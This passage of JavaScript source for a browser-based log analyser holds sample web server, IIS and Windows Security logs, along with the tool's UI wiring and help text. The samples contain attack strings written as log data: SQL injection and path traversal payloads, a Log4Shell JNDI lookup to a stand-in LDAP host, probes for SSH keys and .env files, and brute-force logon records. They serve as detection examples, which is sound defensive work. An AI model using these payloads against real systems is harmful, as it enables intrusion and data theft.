      '198.51.100.202 - - [31/Aug/2026:11:03:19 +0000] "GET /.ssh/id_rsa HTTP/1.1" 404 162 "-" "python-requests/2.31.0"',
      '198.51.100.202 - - [31/Aug/2026:11:03:19 +0000] "GET /administrator/index.php HTTP/1.1" 404 162 "-" "python-requests/2.31.0"',
      '203.0.113.55 - - [31/Aug/2026:11:04:01 +0000] "GET /assets/app.js HTTP/1.1" 200 42118 "https://example.test/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"',
      '203.0.113.55 - - [31/Aug/2026:11:04:02 +0000] "GET /assets/logo.svg HTTP/1.1" 200 3140 "https://example.test/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"',
      '192.0.2.140 - - [31/Aug/2026:11:04:30 +0000] "GET / HTTP/1.1" 200 5120 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"',
      '192.0.2.140 - - [31/Aug/2026:11:04:31 +0000] "GET /assets/app.css HTTP/1.1" 200 18422 "https://example.test/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"',
      '192.0.2.140 - - [31/Aug/2026:11:04:33 +0000] "GET /assets/app.js HTTP/1.1" 200 42118 "https://example.test/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"',
      '192.0.2.140 - - [31/Aug/2026:11:05:02 +0000] "GET /pricing HTTP/1.1" 200 7204 "https://example.test/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"',
      '192.0.2.140 - - [31/Aug/2026:11:05:44 +0000] "GET /pricing HTTP/1.1" 304 0 "https://example.test/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"',
      '198.51.100.4 - - [31/Aug/2026:11:06:10 +0000] "GET /robots.txt HTTP/1.1" 200 118 "-" "Mozilla/5.0 (compatible; ExampleBot/1.0)"',
      '198.51.100.4 - - [31/Aug/2026:11:06:11 +0000] "GET /sitemap.xml HTTP/1.1" 200 9042 "-" "Mozilla/5.0 (compatible; ExampleBot/1.0)"',
      '198.51.100.4 - - [31/Aug/2026:11:06:20 +0000] "GET /blog/ HTTP/1.1" 200 11208 "-" "Mozilla/5.0 (compatible; ExampleBot/1.0)"',
      '198.51.100.4 - - [31/Aug/2026:11:06:24 +0000] "GET /blog/log-analysis HTTP/1.1" 200 14620 "-" "Mozilla/5.0 (compatible; ExampleBot/1.0)"',
      '198.51.100.4 - - [31/Aug/2026:11:06:29 +0000] "GET /blog/incident-response HTTP/1.1" 200 13980 "-" "Mozilla/5.0 (compatible; ExampleBot/1.0)"',
      '203.0.113.55 - - [31/Aug/2026:11:06:55 +0000] "POST /api/session HTTP/1.1" 200 240 "https://example.test/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"',
      '203.0.113.55 - - [31/Aug/2026:11:07:01 +0000] "GET /api/orders?page=1 HTTP/1.1" 200 8804 "https://example.test/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"',
      '203.0.113.55 - - [31/Aug/2026:11:07:09 +0000] "GET /api/orders?page=2 HTTP/1.1" 200 8712 "https://example.test/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"',
      '192.0.2.140 - - [31/Aug/2026:11:07:22 +0000] "GET /favicon.ico HTTP/1.1" 200 1150 "https://example.test/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"',
      '192.0.2.31 - - [31/Aug/2026:11:07:44 +0000] "GET /search?q=1%27%20OR%20%271%27=%271 HTTP/1.1" 200 4120 "-" "sqlmap/1.8#stable (https://sqlmap.org)"',
      '192.0.2.31 - - [31/Aug/2026:11:07:46 +0000] "GET /search?q=1+UNION+SELECT+null,version()--+- HTTP/1.1" 500 512 "-" "sqlmap/1.8#stable (https://sqlmap.org)"',
      '192.0.2.31 - - [31/Aug/2026:11:07:49 +0000] "GET /product?id=1+AND+SLEEP(5) HTTP/1.1" 200 4118 "-" "sqlmap/1.8#stable (https://sqlmap.org)"',
      '192.0.2.31 - - [31/Aug/2026:11:08:02 +0000] "GET /download?file=../../../../etc/passwd HTTP/1.1" 403 199 "-" "sqlmap/1.8#stable (https://sqlmap.org)"',
      '192.0.2.31 - - [31/Aug/2026:11:08:05 +0000] "GET /view?page=%2e%2e%2f%2e%2e%2fconfig.php HTTP/1.1" 404 162 "-" "sqlmap/1.8#stable (https://sqlmap.org)"',
      '192.0.2.77 - - [31/Aug/2026:11:10:00 +0000] "GET /?x=${jndi:ldap://192.0.2.99:1389/a} HTTP/1.1" 400 226 "-" "${jndi:ldap://192.0.2.99:1389/a}"',
      '203.0.113.9 - admin [31/Aug/2026:11:12:00 +0000] "GET /private/ HTTP/1.1" 401 188 "-" "Mozilla/5.0"',
      '203.0.113.9 - admin [31/Aug/2026:11:12:04 +0000] "GET /private/ HTTP/1.1" 401 188 "-" "Mozilla/5.0"',
      '203.0.113.9 - admin [31/Aug/2026:11:12:09 +0000] "GET /private/ HTTP/1.1" 401 188 "-" "Mozilla/5.0"',
      '203.0.113.9 - admin [31/Aug/2026:11:12:15 +0000] "GET /private/ HTTP/1.1" 401 188 "-" "Mozilla/5.0"',
      '203.0.113.9 - admin [31/Aug/2026:11:12:22 +0000] "GET /private/report.csv HTTP/1.1" 200 48219044 "-" "Mozilla/5.0"',
      '203.0.113.55 - - [31/Aug/2026:11:20:41 +0000] "GET /about HTTP/1.1" 200 6110 "https://example.test/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"',
      '203.0.113.55 - - [31/Aug/2026:11:22:19 +0000] "GET /contact HTTP/1.1" 200 5904 "https://example.test/about" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"'
    ].join('\n'),

    iis: [
      '#Software: Microsoft Internet Information Services 10.0',
      '#Version: 1.0',
      '#Date: 2026-08-31 00:00:00',
      '#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status sc-bytes time-taken',
      '2026-08-31 08:00:04 10.0.0.8 GET /Default.aspx - 443 - 203.0.113.61 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64) - 200 0 0 8422 31',
      '2026-08-31 08:00:19 10.0.0.8 GET /Reports/Monthly.aspx id=44 443 CONTOSO\\jsmith 203.0.113.61 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64) - 200 0 0 21044 78',
      '2026-08-31 08:11:02 10.0.0.8 GET /admin/login.aspx - 443 - 198.51.100.140 Nikto/2.5.0 - 404 0 2 1240 12',
      '2026-08-31 08:11:03 10.0.0.8 GET /phpmyadmin/ - 443 - 198.51.100.140 Nikto/2.5.0 - 404 0 2 1240 9',
      '2026-08-31 08:11:04 10.0.0.8 GET /.env - 443 - 198.51.100.140 Nikto/2.5.0 - 404 0 2 1240 8',
      '2026-08-31 08:11:05 10.0.0.8 GET /backup.zip - 443 - 198.51.100.140 Nikto/2.5.0 - 404 0 2 1240 8',
      '2026-08-31 08:11:06 10.0.0.8 GET /cgi-bin/test.cgi - 443 - 198.51.100.140 Nikto/2.5.0 - 404 0 2 1240 7',
      '2026-08-31 08:11:07 10.0.0.8 GET /manager/html - 443 - 198.51.100.140 Nikto/2.5.0 - 401 2 5 1188 6',
      '2026-08-31 08:11:08 10.0.0.8 GET /wp-login.php - 443 - 198.51.100.140 Nikto/2.5.0 - 404 0 2 1240 7',
      '2026-08-31 08:11:09 10.0.0.8 GET /Trace.axd - 443 - 198.51.100.140 Nikto/2.5.0 - 404 0 2 1240 7',
      '2026-08-31 08:11:10 10.0.0.8 GET /elmah.axd - 443 - 198.51.100.140 Nikto/2.5.0 - 404 0 2 1240 7',
      '2026-08-31 08:11:11 10.0.0.8 GET /web.config - 443 - 198.51.100.140 Nikto/2.5.0 - 404 0 2 1240 7',
      '2026-08-31 08:11:12 10.0.0.8 GET /App_Data/db.mdf - 443 - 198.51.100.140 Nikto/2.5.0 - 404 0 2 1240 7',
      '2026-08-31 08:11:13 10.0.0.8 GET /aspnet_client/ - 443 - 198.51.100.140 Nikto/2.5.0 - 404 0 2 1240 7',
      '2026-08-31 08:11:14 10.0.0.8 GET /old.bak - 443 - 198.51.100.140 Nikto/2.5.0 - 404 0 2 1240 7',
      '2026-08-31 08:11:15 10.0.0.8 GET /test.asp - 443 - 198.51.100.140 Nikto/2.5.0 - 404 0 2 1240 7',
      '2026-08-31 08:22:41 10.0.0.8 GET /Search.aspx q=%27+OR+1%3D1-- 443 - 192.0.2.212 Mozilla/5.0 - 500 0 0 620 15',
      '2026-08-31 08:22:44 10.0.0.8 GET /Search.aspx q=1+UNION+SELECT+name+FROM+information_schema.tables 443 - 192.0.2.212 Mozilla/5.0 - 200 0 0 4102 22',
      '2026-08-31 08:23:02 10.0.0.8 GET /Files.aspx path=..%5c..%5cweb.config 443 - 192.0.2.212 Mozilla/5.0 - 403 0 0 340 5',
      '2026-08-31 08:31:19 10.0.0.8 GET /Reports/Export.aspx id=44 443 CONTOSO\\jsmith 203.0.113.61 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64) - 200 0 0 62110488 4120',
      '2026-08-31 08:44:02 10.0.0.8 GET /Default.aspx - 443 - 203.0.113.61 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64) - 200 0 0 8422 29'
    ].join('\n'),

    winsec: [
      '"Level","Date and Time","Source","Event ID","Task Category","Message"',
      '"Information","2026-08-31 07:59:41","Microsoft-Windows-Security-Auditing","4624","Logon","An account was successfully logged on.\n\nSubject:\n\tAccount Name:\t\tDC01$\n\nLogon Type:\t\t3\n\nNew Logon:\n\tAccount Name:\t\tsvc-sql\n\tAccount Domain:\t\tCONTOSO\n\nNetwork Information:\n\tSource Network Address:\t10.0.0.42"',
      '"Information","2026-08-31 08:04:02","Microsoft-Windows-Security-Auditing","4625","Logon","An account failed to log on.\n\nSubject:\n\tAccount Name:\t\t-\n\nLogon Type:\t\t3\n\nAccount For Which Logon Failed:\n\tAccount Name:\t\tadministrator\n\nFailure Information:\n\tStatus:\t\t\t0xC000006D\n\tSub Status:\t\t0xC000006A\n\nNetwork Information:\n\tWorkstation Name:\tWIN-8H2K\n\tSource Network Address:\t198.51.100.66"',
      '"Information","2026-08-31 08:04:05","Microsoft-Windows-Security-Auditing","4625","Logon","An account failed to log on.\n\nLogon Type:\t\t3\n\nAccount For Which Logon Failed:\n\tAccount Name:\t\tadministrator\n\nFailure Information:\n\tSub Status:\t\t0xC000006A\n\nNetwork Information:\n\tSource Network Address:\t198.51.100.66"',
      '"Information","2026-08-31 08:04:09","Microsoft-Windows-Security-Auditing","4625","Logon","An account failed to log on.\n\nLogon Type:\t\t3\n\nAccount For Which Logon Failed:\n\tAccount Name:\t\tadministrator\n\nFailure Information:\n\tSub Status:\t\t0xC000006A\n\nNetwork Information:\n\tSource Network Address:\t198.51.100.66"',
      '"Information","2026-08-31 08:04:13","Microsoft-Windows-Security-Auditing","4625","Logon","An account failed to log on.\n\nLogon Type:\t\t3\n\nAccount For Which Logon Failed:\n\tAccount Name:\t\tadministrator\n\nFailure Information:\n\tSub Status:\t\t0xC000006A\n\nNetwork Information:\n\tSource Network Address:\t198.51.100.66"',
      '"Information","2026-08-31 08:04:17","Microsoft-Windows-Security-Auditing","4625","Logon","An account failed to log on.\n\nLogon Type:\t\t3\n\nAccount For Which Logon Failed:\n\tAccount Name:\t\tadministrator\n\nFailure Information:\n\tSub Status:\t\t0xC000006A\n\nNetwork Information:\n\tSource Network Address:\t198.51.100.66"',
      '"Information","2026-08-31 08:04:21","Microsoft-Windows-Security-Auditing","4625","Logon","An account failed to log on.\n\nLogon Type:\t\t3\n\nAccount For Which Logon Failed:\n\tAccount Name:\t\tadministrator\n\nFailure Information:\n\tSub Status:\t\t0xC000006A\n\nNetwork Information:\n\tSource Network Address:\t198.51.100.66"',
      '"Information","2026-08-31 08:04:25","Microsoft-Windows-Security-Auditing","4625","Logon","An account failed to log on.\n\nLogon Type:\t\t3\n\nAccount For Which Logon Failed:\n\tAccount Name:\t\tadministrator\n\nFailure Information:\n\tSub Status:\t\t0xC000006A\n\nNetwork Information:\n\tSource Network Address:\t198.51.100.66"',
      '"Information","2026-08-31 08:04:29","Microsoft-Windows-Security-Auditing","4625","Logon","An account failed to log on.\n\nLogon Type:\t\t3\n\nAccount For Which Logon Failed:\n\tAccount Name:\t\tadministrator\n\nFailure Information:\n\tSub Status:\t\t0xC000006A\n\nNetwork Information:\n\tSource Network Address:\t198.51.100.66"',
      '"Information","2026-08-31 08:04:33","Microsoft-Windows-Security-Auditing","4625","Logon","An account failed to log on.\n\nLogon Type:\t\t3\n\nAccount For Which Logon Failed:\n\tAccount Name:\t\tadministrator\n\nFailure Information:\n\tSub Status:\t\t0xC000006A\n\nNetwork Information:\n\tSource Network Address:\t198.51.100.66"',
      '"Information","2026-08-31 08:04:38","Microsoft-Windows-Security-Auditing","4624","Logon","An account was successfully logged on.\n\nLogon Type:\t\t10\n\nNew Logon:\n\tAccount Name:\t\tadministrator\n\tAccount Domain:\t\tCONTOSO\n\nNetwork Information:\n\tSource Network Address:\t198.51.100.66"',
      '"Information","2026-08-31 08:04:39","Microsoft-Windows-Security-Auditing","4672","Special Logon","Special privileges assigned to new logon.\n\nSubject:\n\tAccount Name:\t\tadministrator\n\tPrivileges:\t\tSeDebugPrivilege\n\t\t\tSeTakeOwnershipPrivilege"',
      '"Information","2026-08-31 08:09:12","Microsoft-Windows-Security-Auditing","4740","User Account Management","A user account was locked out.\n\nSubject:\n\tAccount Name:\t\tDC01$\n\nAccount That Was Locked Out:\n\tAccount Name:\t\tjsmith\n\nAdditional Information:\n\tCaller Computer Name:\tWIN-8H2K"',
      '"Information","2026-08-31 08:15:55","Microsoft-Windows-Security-Auditing","4624","Logon","An account was successfully logged on.\n\nLogon Type:\t\t3\n\nNew Logon:\n\tAccount Name:\t\tadministrator\n\tAccount Domain:\t\tCONTOSO\n\nNetwork Information:\n\tSource Network Address:\t10.0.0.42"'
    ].join('\n')
  };

  /* ======================================================================
     Wiring
     ====================================================================== */

  function currentText() {
    var box = document.getElementById('tool-text');
    return box ? box.value : '';
  }

  function run() {
    lastText = currentText();
    analyse(lastText, lastName || '');
  }

  function setText(text, name) {
    var box = document.getElementById('tool-text');
    if (box) box.value = text;
    lastText = text;
    lastName = name || '';
    var nameEl = document.getElementById('tool-dropname');
    if (nameEl) nameEl.textContent = name || '';
    analyse(text, lastName);
  }

  LabTool.define({
    id: 'loganalysertool',
    run: run,
    onReady: function () {
      LabTool.onFile({
        dropId: 'tool-drop', inputId: 'tool-file', maxBytes: MAX_BYTES,
        onFile: function (bytes, file) {
          /* Logs are text. Decoding as UTF-8 and falling back to latin-1 keeps
             a log written by an older Windows service readable instead of
             filling the pane with replacement characters. */
          var text;
          try {
            text = new TextDecoder('utf-8', { fatal: false }).decode(bytes);
          } catch (err) {
            text = '';
            for (var i = 0; i < bytes.length; i += 4096) {
              text += String.fromCharCode.apply(null, bytes.subarray(i, Math.min(i + 4096, bytes.length)));
            }
          }
          setText(text, file.name + '  (' + LabTool.humanBytes(bytes.length) + ')');
        },
        onError: function (msg) { R.clear().err(msg); }
      });

      var fmt = document.getElementById('tool-format');
      if (fmt) fmt.addEventListener('change', function () { if (currentText()) run(); });

      var sample = document.getElementById('tool-sample');
      if (sample) {
        sample.addEventListener('change', function () {
          var key = sample.value;
          if (!key || !SAMPLES[key]) return;
          if (fmt) fmt.value = 'auto';
          setText(SAMPLES[key], 'worked example: ' + key);
          sample.value = '';
        });
      }

      var copyBtn = document.getElementById('tool-copy');
      if (copyBtn) {
        copyBtn.addEventListener('click', function () {
          if (!reported) { R.clear().warn('There is no report to copy yet — analyse a log first.'); return; }
          LabTool.copy(R.text(), copyBtn);
        });
      }

      var saveBtn = document.getElementById('tool-save');
      if (saveBtn) {
        saveBtn.addEventListener('click', function () {
          if (!reported) { R.clear().warn('There is no report to save yet — analyse a log first.'); return; }
          var stamp = new Date().toISOString().slice(0, 19).replace(/[:T]/g, '-');
          var head = 'Log analysis report\n' +
                     'Generated ' + new Date().toISOString() + ' by ' +
                     'https://krunalkumar.dpdns.org/labs/log-analyser\n' +
                     'Produced entirely in the browser. The log was never uploaded.\n' +
                     '─'.repeat(52) + '\n\n';
          LabTool.download(head + R.text() + '\n', 'log-analysis-' + stamp + '.txt', 'text/plain');
        });
      }

      var clearBtn = document.getElementById('tool-clear');
      if (clearBtn) {
        clearBtn.addEventListener('click', function () {
          var box = document.getElementById('tool-text');
          if (box) { box.value = ''; box.focus(); }
          lastName = '';
          reported = false;
          var nameEl = document.getElementById('tool-dropname');
          if (nameEl) nameEl.textContent = '';
          R.clear();
          hello();
        });
      }

      hello();
    }
  });

  function hello() {
    R.dim('Paste a log on the left, or drop a file on the zone above it.');
    R.dim('');
    R.dim('Five formats are read: Linux auth.log / secure, nginx and Apache access');
    R.dim('logs, IIS W3C extended, Windows Security event exports as CSV, and');
    R.dim('generic syslog as a fallback. The format is detected and named in the');
    R.dim('report; the selector overrides it when the guess is wrong.');
    R.dim('');
    R.dim('What it looks for: failed authentication clustered by source, with');
    R.dim('brute force and password spray told apart; a success that followed a run');
    R.dim('of failures; one account authenticating from two places minutes apart;');
    R.dim('and on web logs, scanner fingerprints, injection and traversal attempts,');
    R.dim('the status profile and unusual response sizes.');
    R.dim('');
    R.dim('It is not a SIEM. No correlation across sources, no threat intelligence,');
    R.dim('no geolocation, nothing stored. It reads one file and describes it.');
    R.dim('');
    R.dim('Nothing is uploaded. A log is a list of your usernames, your addresses');
    R.dim('and your working hours, which is exactly why this runs in your own tab.');
  }
})();
